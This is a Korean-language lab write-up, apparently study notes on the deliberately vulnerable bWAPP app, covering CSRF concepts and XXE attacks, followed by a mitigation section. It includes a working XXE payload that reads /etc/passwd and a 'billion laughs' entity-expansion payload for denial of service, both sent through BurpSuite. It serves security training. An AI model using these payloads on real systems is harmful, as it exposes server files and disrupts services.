---
title: "[bWAPP] 8. Cross-Site Request Forgery - XML External Entity Attacks (XXE)"
---

<br>

## Cross-Site Request Forgery

크로스 사이트 요청 변조는 공격자에 의해 사용자가 의도하지 않은 악의적인 행위를 서버에 요청하는 취약점.

공격자가 입력한 악의적인 스크립트 코드에 접근하면 사용자의 웹 브라우저는 스크립트 코드에서 의도한 내용을 웹 서버에 요청한다.

웹 서버는 변조된 요청을 사용자의 정상적인 요청으로 판단한여 응답을 보낸다.

<br><br>

## CSRF와  XSS의 차이

CSRF는 웹 브라우저를 신뢰해서 발생하는 취약점으로, 웹 사이트 사용자가 보낸 정상적인 요청과 변조된 요청을 구별하지 못한다.

또한, XSS는 공격 대상이 사용자이지만, CSRF는 사용자가 공격의 매개물로 공격자를 대신하여 악의적인 요청을 웹사이트에 요청한다.

<br><br>

## XML External Entity Attacks (XXE)

- XML 외부 엔티티 공격에는 SYSTEM 키워드를 사용하는데, SYTEM 키워드로 XML 파서를 발생하게 하면 페이지의 내용을 대체하는 권한이 생기고, 공격자는 XML 파서로 서버 시스템에 접근할 수 있다.

<BR>
<bR>

## 난이도 : 하

![image-20220324235545552](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220324235545552.png)

- [Any Bugs?]를 클릭하면 비밀번호 힌트를 초기화하는 기능을 XML코드로 제공한다.

<BR>

### BurpSuite

![image-20220325002000018](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220325002000018.png)

- [Any Bugs?]를 눌러 패킷을 캡쳐해준 후에 Repeater로 보내준다.
- 보내준 후 바디부분에 다음과 같이 XML 코드를 삽입해주자
- 다음 XML 코드는 'bWAPP'이라는 외부엔티티를 선언하여 서버의 'passwd' 라는 파일을 출력한다.
- 엔티티 선언 후에는 선언한 엔티티를 참조하기 위해 '&bWAPP;'을 변수에 입력한다.

```xml-dtd
<?xml version= "1.0" encoding= "utf-8"?>
<!DOCTYPE root [
<!ENTITY bWAPP SYSTEM "file:///etc/passwd">
]>
<reset><login>&bWAPP;</login><secret>blah</secret></reset>
```

<br>

![image-20220325002548110](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220325002548110.png)

- 요청 상단에 Send 버튼을 눌면 다음과 같이 응답값인 etc 디렉토리의 passwd 파일이 오른쪽에 출력된다.
- 또한, [Any Bugs?]를 눌렀을 때 xxe-1.php 페이지에서 xxe-2.php로 넘어가는 것을 확인할 수 있다.

<br>

### DoS(Denial of Service)

- 이번에는 XML 코드로 하는 도스 공격인 XDoS 공격을 해보자
- 마찬가지로 [Any Bugs?] 버튼을 눌러 BurpSuite로 패킷을 캡쳐해주고 Repeater로 넘겨준 후 요청 Body 부분에 다음 XML 코드를 삽입해주자.
- 다음 XML 코드는 반복되는 문자열을 출력하는 여러 외부 엔티티를 선언하는데
- 엔티티 선언 후에는 선언한 엔티티를 참조하기 위해 외부 엔티티를 선택하여 '&lol9;'을 변수에 입력한다.

```xml-dtd
<?xml version= "1.0" encoding= "utf-8"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT login (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<reset><login>&lol9;</login><secret>blah</secret></reset>
```

<br>

### BurpSuite

![image-20220325003206548](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220325003206548.png)

- 입력하고 한 동안 응답이 오지 않는데

<br>

![image-20220325003249093](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220325003249093.png)

- 약 30초~1분 사이에 응답이 오는 것을 확인할 수 있다.
- 이는 애플리케이션 계층에서 일어나는 DoS 공격이기에 웹 서비스 제공을 방해하기 떄문에 그렇다.

<br>

<br>

## 대응방안

### 난이도 중

![image-20220325003627750](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220325003627750.png)

- 난이도 중이상에서는 다음과 같이 코드가 먹히지 않고 원래 출력되는 메시지만 출력되는 것을 확인할 수 있다.

<br>

### Linux

![image-20220325003751647](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220325003751647.png)

- vi 편집기를 통해 xxe-2.php 소스코드를 열어주자
- 난이도 중,상에서는 login 변수에 사용하는 아이디를 세션에서 받아 입력하기 때문에 BurpSuite를 통해 수정해도 로그인한 사용자의 비밀번호 힌트가 초기화된다.
- 또한, 비밀번호 힌트를 mysqli_real_escape_string 함수를 통해 우회한다.
  - SQL 인젝션에 사용하는 특수 문자는 XXE 공격에도 많이 사용되므로 NULL, \n, \r, \, ', ", ^Z 문자 앞에 백슬래시를 추가하여 XML 코드를 일반 문자로 변경한다.
- 그 다음에는 MySQL 업데이트 셋 구문으로 secret 변수에 입력된 내용을 비밀번호 힌트로 초기화한다.

<br>

<br>

## Reference

![image-20220321173522102](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220321173522102.png)

- 비박스 환경을 활용한 웹 모의해킹 완벽 실습
